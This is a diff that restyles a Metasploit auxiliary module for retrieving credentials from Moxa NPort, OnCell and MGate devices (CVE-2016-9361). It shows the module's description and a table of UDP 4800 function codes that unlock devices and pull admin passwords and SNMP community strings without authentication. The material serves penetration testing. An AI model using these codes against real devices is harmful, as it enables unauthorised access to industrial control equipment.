@@ -8,64 +8,67 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Moxa Device Credential Retrieval',
-      'Description'    => %q{
-        The Moxa protocol listens on 4800/UDP and will respond to broadcast
-        or direct traffic.  The service is known to be used on Moxa devices
-        in the NPort, OnCell, and MGate product lines.  Many devices with
-        firmware versions older than 2017 or late 2016 allow admin credentials
-        and SNMP read and read/write community strings to be retrieved without
-        authentication.
+    super(
+      update_info(
+        info,
+        'Name' => 'Moxa Device Credential Retrieval',
+        'Description' => %q{
+          The Moxa protocol listens on 4800/UDP and will respond to broadcast
+          or direct traffic.  The service is known to be used on Moxa devices
+          in the NPort, OnCell, and MGate product lines.  Many devices with
+          firmware versions older than 2017 or late 2016 allow admin credentials
+          and SNMP read and read/write community strings to be retrieved without
+          authentication.
 
-        This module is the work of Patrick DeSantis of Cisco Talos and K. Reid
-        Wightman.
+          This module is the work of Patrick DeSantis of Cisco Talos and K. Reid
+          Wightman.
 
-        Tested on: Moxa NPort 6250 firmware v1.13, MGate MB3170 firmware 2.5,
-        and NPort 5110 firmware 2.6.
-
-      },
-      'Author'         =>
-        [
+          Tested on: Moxa NPort 6250 firmware v1.13, MGate MB3170 firmware 2.5,
+          and NPort 5110 firmware 2.6.
+        },
+        'Author' => [
           'Patrick DeSantis <p[at]t-r10t.com>',
           'K. Reid Wightman <reid[at]revics-security.com>'
         ],
 
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2016-9361'],
           [ 'BID', '85965'],
           [ 'URL', 'https://www.digitalbond.com/blog/2016/10/25/serial-killers/'],
           [ 'URL', 'https://github.com/reidmefirst/MoxaPass/blob/master/moxa_getpass.py' ],
           [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-336-02']
         ],
-      'DisclosureDate' => '2015-07-28'))
+        'DisclosureDate' => '2015-07-28'
+      )
+    )
 
     register_options([
       # Moxa protocol listens on 4800/UDP by default
       Opt::RPORT(4800),
-      OptEnum.new("FUNCTION", [true, "Pull credentials or enumerate all function codes", "CREDS",
+      OptEnum.new("FUNCTION", [
+        true, "Pull credentials or enumerate all function codes", "CREDS",
         [
           "CREDS",
           "ENUM"
-        ]])
+        ]
       ])
+    ])
   end
 
   def fc() {
     # Function codes
-    'ident'         =>  "\x01",   # identify device
-    'name'          =>  "\x10",   # get the "server name" of the device
-    'netstat'       =>  "\x14",   # network activity of the device
-    'unlock1'       =>  "\x16",   # "unlock" some devices, including 5110, MGate
-    'date_time'     =>  "\x1a",   # get the device date and time
-    'time_server'   =>  "\x1b",   # get the time server of device
-    'unlock2'       =>  "\x1e",   # "unlock" 6xxx series devices
-    'snmp_read'     =>  "\x28",   # snmp community strings
-    'pass'          =>  "\x29",   # admin password of some devices
-    'all_creds'     =>  "\x2c",   # snmp comm strings and admin password of 6xxx
-    'enum'          =>  "enum"    # mock fc to catch "ENUM" option
+    'ident' => "\x01", # identify device
+    'name' => "\x10", # get the "server name" of the device
+    'netstat' => "\x14",   # network activity of the device
+    'unlock1' => "\x16",   # "unlock" some devices, including 5110, MGate
+    'date_time' => "\x1a", # get the device date and time
+    'time_server' => "\x1b", # get the time server of device
+    'unlock2' => "\x1e", # "unlock" 6xxx series devices
+    'snmp_read' => "\x28", # snmp community strings
+    'pass' => "\x29", # admin password of some devices
+    'all_creds' => "\x2c", # snmp comm strings and admin password of 6xxx
+    'enum' => "enum" # mock fc to catch "ENUM" option
   }
   end
 
@@ -106,17 +109,18 @@ class MetasploitModule < Msf::Auxiliary
           # invalid response, so don't bother trying to parse it
           return
         end
+
         if fc[func] == "\x2c"
           # try this, note it may fail
           get_creds(response)
         end
         if fc[func] == "\x29"
-        # try this, note it may fail
-        get_pass(response)
+          # try this, note it may fail
+          get_pass(response)
         end
         if fc[func] == "\x28"
-        # try this, note it may fail
-        get_snmp_read(response)
+          # try this, note it may fail
+          get_snmp_read(response)
         end
       rescue ::Timeout::Error
       end
@@ -198,6 +202,7 @@ class MetasploitModule < Msf::Auxiliary
     # output response bytes as hexdump
     vprint_status("Response:\n#{Rex::Text.to_hex_dump(resp)}")
   end
+
   def check
     connect_udp
 
